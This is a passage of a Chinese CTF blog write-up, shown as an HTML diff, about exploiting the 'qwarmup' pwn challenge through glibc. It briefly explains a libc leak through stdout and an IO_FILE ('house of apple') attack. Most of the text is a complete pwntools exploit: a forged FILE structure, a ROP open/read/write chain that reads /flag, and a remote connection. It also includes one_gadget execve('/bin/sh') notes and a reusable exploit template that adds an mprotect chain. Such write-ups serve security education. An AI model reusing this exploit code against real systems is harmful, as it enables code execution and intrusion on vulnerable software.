+<p>根据复杂度我们先看看rdi可不可控，<code>rdi + 0x68</code>中rdi是l,所以我们如果想要控制赋值之后的rdi，必须要将其<code>rdi + 0x68</code>的地址进行修改，而我们目前只能做libc上的任意地址写，因此需要找一个[rax + 0x8]是一个libc的位置，暂时只能找到这一个，但是是ld，凑活用着先</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704231837863.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704231837863.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704231837863.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704231837863.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704231837863.png"
+        title="image-20230704231837863" /></p>
+<p>因此我们可以将rdi + 0x68里面的值通过低位修改修改为该值，然后再用libc任意地址写，将该地址里面的内容写入我们要调用的函数。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704234502247.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704234502247.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704234502247.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704234502247.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704234502247.png"
+        title="image-20230704234502247" /></p>
+<h3 id="泄露libc--orw">泄露libc &amp;&amp; orw</h3>
+<p>可以通过调用IO_flush_all来刷新流，通过stdout来泄露出libc。</p>
+<p>然后通过IO_FILE_ATTACK来orw出flag。io部分不细说了，很多方法，io_file_jumps再我patch的版本是可写的，当然也可以选择house of apple的方法来搞。修改io_stderr的chain字段为我们可控地址，然后再可控地址上面伪造链子</p>
+<h2 id="exp">exp</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">arw</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#context.log_level = &#34;debug&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#attach(p)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x100000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x341210</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x70</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#0x7ffff7ffe220</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arw</span><span class="p">(</span><span class="mh">0x2f7750</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xc8</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arw</span><span class="p">(</span><span class="mh">0x341122</span><span class="o">-</span><span class="mh">0x10</span><span class="p">,</span><span class="s2">&#34;_IO_flush_all&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arw</span><span class="p">(</span><span class="mh">0x341278</span><span class="p">,</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xd0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">l64</span><span class="p">()</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;_IO_2_1_stdin_&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free_hook1</span> <span class="o">=</span> <span class="n">free_hook</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rsp</span> <span class="o">=</span> <span class="mh">0x000000000002d77b</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000002daa2</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000037bfa</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x00000000000876e9</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x00000000000446b0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000088376</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leaver</span> <span class="o">=</span> <span class="mh">0x0000000000052d62</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arw</span><span class="p">(</span><span class="mh">0x341278</span><span class="p">,</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f1</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f1</span><span class="o">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f1</span><span class="o">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;_IO_file_jumps&#34;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x540</span> <span class="c1">#IO_wfile_jumps</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f1</span><span class="o">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="mh">0x1f5730</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="c1">#_IO_stdfile_2_lock</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">free_hook1</span> <span class="c1">#可控地址</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f1</span><span class="o">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="mh">0xe0</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">f1</span><span class="o">.</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">pop_rsp</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f1</span><span class="o">.</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="mh">0xe0</span> <span class="o">+</span> <span class="mh">0xe8</span> <span class="c1">#rop链子</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f1</span><span class="o">.</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free_hook1</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;__free_hook&#34;</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f1</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">f1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">:{</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="p">:</span><span class="n">f1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xe0</span><span class="p">:{</span><span class="c1">#addr</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0x68</span><span class="p">:[</span><span class="n">leaver</span><span class="p">],</span><span class="c1">#call</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0xe0</span><span class="p">:[</span><span class="n">addr</span><span class="o">+</span> <span class="mh">0xe0</span><span class="p">],</span><span class="c1">#[[addr + 0xe0] + 0x68]-&gt;call</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0xe8</span><span class="p">:[</span><span class="n">pop_rdi</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">pop_rsi</span><span class="p">,</span><span class="n">free_hook1</span> <span class="o">+</span> <span class="mh">0x500</span><span class="p">,</span><span class="n">pop_rdx</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">pop_rax</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">syscall</span><span class="p">,</span><span class="n">pop_rdi</span><span class="p">,</span><span class="n">free_hook1</span><span class="o">+</span><span class="mh">0x500</span><span class="p">,</span><span class="n">pop_rsi</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">pop_rax</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">syscall</span><span class="p">,</span><span class="n">pop_rdi</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">pop_rsi</span><span class="p">,</span><span class="n">free_hook1</span><span class="p">,</span><span class="n">pop_rdx</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="n">pop_rax</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">syscall</span><span class="p">,</span><span class="n">pop_rdi</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">pop_rax</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">syscall</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span><span class="n">filler</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arw</span><span class="p">(</span><span class="mh">0x2fdff0</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arw</span><span class="p">(</span><span class="mh">0x2f76d8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arw</span><span class="p">(</span><span class="mh">0x341278</span><span class="p">,</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xd0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># attach(p)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/flag</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;qwarmup&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;qwarmup&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">l64</span> <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">l32</span> <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lg</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">name</span> <span class="o">+</span> <span class="s2">&#34;: 0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">se</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">payload</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rl</span>  <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">payload</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span>     <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exp</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">0x50a37 posix_spawn(rsp+0x1c, &#34;/bin/sh&#34;, 0, rbp, rsp+0x60, environ)
+</span></span></span><span class="line"><span class="cl"><span class="s2">constraints:
+</span></span></span><span class="line"><span class="cl"><span class="s2">  rsp &amp; 0xf == 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">  rcx == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">  rbp == NULL || (u16)[rbp] == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">0xebcf1 execve(&#34;/bin/sh&#34;, r10, [rbp-0x70])
+</span></span></span><span class="line"><span class="cl"><span class="s2">constraints:
+</span></span></span><span class="line"><span class="cl"><span class="s2">  address rbp-0x78 is writable
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [r10] == NULL || r10 == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">0xebcf5 execve(&#34;/bin/sh&#34;, r10, rdx)
+</span></span></span><span class="line"><span class="cl"><span class="s2">constraints:
+</span></span></span><span class="line"><span class="cl"><span class="s2">  address rbp-0x78 is writable
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [r10] == NULL || r10 == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [rdx] == NULL || rdx == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">0xebcf8 execve(&#34;/bin/sh&#34;, rsi, rdx)
+</span></span></span><span class="line"><span class="cl"><span class="s2">constraints:
+</span></span></span><span class="line"><span class="cl"><span class="s2">  address rbp-0x78 is writable
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [rsi] == NULL || rsi == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [rdx] == NULL || rdx == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705004224280.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705004224280.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705004224280.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705004224280.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705004224280.png"
+        title="image-20230705004224280" /></p>
+<h3 id="house-of-apple-板子">house of apple 板子</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    f1 = FileStructure()
+</span></span><span class="line"><span class="cl">    f1.flags = 0
+</span></span><span class="line"><span class="cl">    f1.vtable = libc_base + libc.sym[&#34;_IO_file_jumps&#34;] - 0x540 #IO_wfile_jumps
+</span></span><span class="line"><span class="cl">    f1._lock = 0x1ee4b0 + libc_base #_IO_stdfile_2_lock
+</span></span><span class="line"><span class="cl">    addr = heap_addr + 0x2a0 #可控地址
+</span></span><span class="line"><span class="cl">    f1._wide_data = addr + 0xe0 
+</span></span><span class="line"><span class="cl">    f1._IO_read_ptr = pop_rsp
+</span></span><span class="line"><span class="cl">    f1._IO_read_end = addr + 0xe0 + 0xe8 #rop链子
+</span></span><span class="line"><span class="cl">    f1._IO_write_ptr = 0x10
+</span></span><span class="line"><span class="cl">    f1 = bytes(f1)
+</span></span><span class="line"><span class="cl">    free_hook1 = (libc_base + libc.sym[&#34;__free_hook&#34;]) &amp; 0xfffffffffffff000
+</span></span><span class="line"><span class="cl">    data = flat({
+</span></span><span class="line"><span class="cl">        0:{
+</span></span><span class="line"><span class="cl">            0:f1,
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        0xe0:{#addr
+</span></span><span class="line"><span class="cl">            0x68:[leaver],#call
+</span></span><span class="line"><span class="cl">            0xe0:[addr+ 0xe0],#[[addr + 0xe0] + 0x68]-&gt;call
+</span></span><span class="line"><span class="cl">            0xe8:[pop_rdi,0,pop_rsi,free_hook1,pop_rdx,0x1000,0x1000,pop_rax,0,syscall,pop_rdi,free_hook1,pop_rsi,0x1000,pop_rdx,0x7,0x7,pop_rax,10,syscall, free_hook1]
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    },filler = &#39;\x00&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-07-05&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/18a4acbbf09e132cd34d0c945caed476a01a69fb" target="_blank" title="commit by cnitlrt(1258175307@qq.com) 18a4acbbf09e132cd34d0c945caed476a01a69fb: test">
+                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>18a4acb</a></span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
